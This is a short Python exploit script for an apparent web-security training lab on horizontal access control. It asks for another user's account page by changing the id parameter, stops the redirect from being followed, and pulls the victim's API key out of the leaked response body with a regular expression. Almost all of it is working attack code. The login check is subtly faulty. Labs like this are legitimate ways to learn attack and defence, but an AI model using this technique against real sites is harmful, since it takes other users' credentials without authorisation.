import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_calors_api_key(s, url):
    account_url = url + "/my-account?id=carlos"
    r = s.get(account_url, allow_redirects=False, verify=False, proxies=proxies)
    if "Log out" and "carlos" in r.text:
        print("[+] Intercepting the redirect and extracting information...")
        api_key = re.search(r"Your API Key is: ([A-Z,a-z,0-9]+)", r.text).group(1)
        print("Found! The API Key is %s" % api_key)
        return
    print("[-] Did not work! Sorry! Exiting the script...")
    sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("\n[+] Lab: User ID controlled by request parameter with data leakage in redirec")
    print("[+] The Web Application has an Access Control Vulnerability that allows malicious users to move horizontally in the app")
    print("[+] In this lab, even though the Web Application blocks attempts to access other users private areas, the content of the requested url is leaked in the redirect message")

    get_calors_api_key(s, url)



if __name__ == "__main__":
    main()